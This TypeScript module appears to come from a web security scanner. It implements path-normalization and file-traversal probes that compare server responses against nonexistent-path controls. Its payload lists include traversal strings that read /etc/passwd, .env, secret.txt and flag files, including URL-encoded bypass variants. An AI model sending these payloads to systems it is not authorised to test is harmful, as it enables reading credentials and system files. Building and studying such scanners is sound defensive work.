// Probe family module — implementation moved verbatim from surface-engine.ts (no behavior change).
import { injectParam, randToken, responseSimilarity } from './context.ts'
import type { DiffContext, DiffOutcome, SurfaceParamLocation } from './context.ts'
import type { ProbeModule } from './registry.ts'



export async function diffPathNormalization(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const [rawPath, query] = req.pathAndQuery.split('?')
  const qs = query ? `?${query}` : ''
  const segments = rawPath.split('/').filter(Boolean)
  if (segments.length < 2) return { verdict: 'inconclusive', summary: 'Need an existing resource path with at least one directory segment.', details: {} }
  const leaf = segments[segments.length - 1]
  const dirName = segments[segments.length - 2]
  const dir = '/' + segments.slice(0, -1).join('/')
  const orig = await send({ method: 'GET', pathAndQuery: req.pathAndQuery, headers: req.headers })
  if (!orig || orig.status >= 400) return { verdict: 'inconclusive', summary: 'The reference resource must return a 2xx/3xx response.', details: { status: orig?.status ?? null } }
  const missing = `kovo-none-${randToken(6)}`
  const control = await send({ method: 'GET', pathAndQuery: `${dir}/..%2f${missing}/${leaf}${qs}`, headers: req.headers })
  const variants = [
    { name: 'dot_segment', path: `${dir}/./${leaf}${qs}` },
    { name: 'self_parent', path: `${dir}/../${dirName}/${leaf}${qs}` },
    { name: 'encoded_slash', path: `${dir}/..%2f${dirName}/${leaf}${qs}` },
    { name: 'semicolon_segment', path: `${dir}/..;/${dirName}/${leaf}${qs}` },
    { name: 'encoded_dots', path: `${dir}/%2e%2e/${dirName}/${leaf}${qs}` },
  ]
  const controlMatchesOrig = Boolean(control && control.status === orig.status && responseSimilarity(orig.body, control.body) >= 0.98)
  const results: Array<Record<string, unknown>> = []
  for (const variant of variants) {
    const ex = await send({ method: 'GET', pathAndQuery: variant.path, headers: req.headers })
    if (!ex) continue
    const sameAsOriginal = ex.status === orig.status && responseSimilarity(orig.body, ex.body) >= 0.98
    results.push({ variant: variant.name, path: variant.path, status: ex.status, sameAsOriginal })
    if (sameAsOriginal && !controlMatchesOrig && variant.name !== 'dot_segment' && variant.name !== 'self_parent') {
      anomalies.push({ type: 'path_normalization_differential', variant: variant.name, status: ex.status })
    }
  }
  const hit = anomalies.length > 0
  return {
    verdict: hit ? 'signal' : 'no_signal',
    summary: hit
      ? 'Encoded or parameterized parent-segment variants resolve to the same resource while a nonexistent-sibling control does not (normalization differential).'
      : 'Path variants behaved consistently with the nonexistent-sibling control.',
    details: { controlMatchesOrig, controlStatus: control?.status ?? null, results },
  }
}



/**
 * File-path traversal oracle. Unlike a pure normalization differential, this proves a jail escape by
 * reading a synthetic known file outside the served directory (classic passwd signature) or by
 * returning content that a nonexistent sibling traversal cannot produce. It never touches host files
 * unless the target itself does so; only response bytes are compared.
 */
export async function diffFileTraversal(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const param = req.param
  if (!param) return { verdict: 'inconclusive', summary: 'A file/path parameter is required for the traversal oracle.', details: {} }
  const location: SurfaceParamLocation = req.paramLocation ?? 'query'
  const missing = `kovo-none-${randToken(8)}.txt`
  const controlValues = [`../${missing}`, `..%2f${missing}`, missing]
  const controls: Array<{ value: string; status: number; body: string }> = []
  for (const value of controlValues.slice(0, 2)) {
    const ex = await send(injectParam({ ...req, param }, value))
    if (ex) controls.push({ value, status: ex.status, body: ex.body.slice(0, 2000) })
  }
  const controlOk = controls.length > 0 && controls.every(c => c.status >= 400 || c.body.length === 0)
  const controlBodies = controls.map(c => c.body).join('\n')
  const passwdSignature = /^[A-Za-z0-9_.-]+:[^:\n]*:\d+:\d+:[^:\n]*:[^:\n]*:[^\n]*$/m
  // Generic read oracles: classic passwd plus standard OS metadata files. The `.log`-style
  // variants are not needed: a content differential only needs a file the served root cannot
  // produce, and a nonexistent-sibling control already covers the negative side.
  const candidates: Array<{ value: string; kind: 'passwd' | 'content' }> = [
    { value: '../../../../etc/passwd', kind: 'passwd' },
    { value: '../../../../../../etc/passwd', kind: 'passwd' },
    { value: '../../../../etc/hostname', kind: 'content' },
    { value: '../../../../etc/os-release', kind: 'content' },
    { value: '../../../../etc/hosts', kind: 'content' },
    { value: '../secret.txt', kind: 'content' },
    { value: '../private/secret.txt', kind: 'content' },
    { value: '../flag.txt', kind: 'content' },
    { value: '../.env', kind: 'content' },
    { value: '../config.json', kind: 'content' },
  ]
  const results: Array<Record<string, unknown>> = []
  // Filter evidence: when a valid in-jail name still resolves after a literal `../` prefix, the
  // handler strips traversal syntax before resolving. Only then is an encoded (double-decoded)
  // variant a legitimate bypass to test; sending it blindly flags hardened single-segment handlers.
  let filterStripsTraversal = false
  if (req.baselineValue) {
    const valid = await send(injectParam({ ...req, param }, req.baselineValue))
    const stripped = await send(injectParam({ ...req, param }, `../${req.baselineValue}`))
    filterStripsTraversal = Boolean(valid && stripped && valid.status >= 200 && valid.status < 300 &&
      stripped.status >= 200 && stripped.status < 300 && responseSimilarity(valid.body, stripped.body) >= 0.95)
  }
  if (filterStripsTraversal) {
    candidates.push(
      { value: '..%2f..%2f..%2f..%2fetc%2fpasswd', kind: 'passwd' },
      { value: '..%2fprivate%2fsecret.txt', kind: 'content' },
      { value: '..%2f..%2fsrv%2fprivate%2fsecret.txt', kind: 'content' },
    )
  }
  for (const cand of candidates) {
    const ex = await send(injectParam({ ...req, param }, cand.value))
    if (!ex) continue
    const ok = ex.status >= 200 && ex.status < 300 && ex.body.trim().length > 0
    const passwd = cand.kind === 'passwd' && passwdSignature.test(ex.body)
    // Content oracle: a non-empty 2xx body that the nonexistent-sibling traversal could not produce.
    const distinguishable = cand.kind === 'content' && ok && !controlBodies.includes(ex.body.slice(0, 200)) &&
      !ex.body.includes(missing) && !ex.body.includes(cand.value)
    results.push({ value: cand.value, kind: cand.kind, status: ex.status, bytes: ex.body.length, passwd, distinguishable })
    if (passwd || distinguishable) {
      const needle = passwd
        ? (ex.body.match(passwdSignature)?.[0] ?? '').slice(0, 40)
        : ex.body.trim().split('\n')[0]?.slice(0, 40) ?? ''
      anomalies.push({
        type: 'path_traversal_escape', param, location, payload: cand.value, oracle: passwd ? 'passwd_signature' : 'content_differential',
        contentNeedle: needle, controlBlocked: controlOk, status: ex.status,
        suggestedReplayKind: 'http_chain',
      })
      return {
        verdict: 'signal',
        summary: 'A relative-path payload read a file outside the served directory (jail-escape oracle).',
        details: { results, controls, suggestedReplayKind: 'http_chain' },
      }
    }
  }
  return {
    verdict: 'no_signal',
    summary: 'No out-of-jail file read was observed; traversal variants stayed inside the served root.',
    details: { results, controls },
  }
}

export const traversalProbe: ProbeModule = {
  family: 'traversal',
  classes: ['path_traversal_benign'],
  run: (ctx) => {
    // A named file/path parameter gets the genuine jail-escape oracle; pure path-shape probing
    // falls back to the benign normalization differential.
    const { req } = ctx
    return req.param && (req.paramLocation ?? 'query') !== 'path'
      ? diffFileTraversal(ctx)
      : diffPathNormalization(ctx)
  },
}
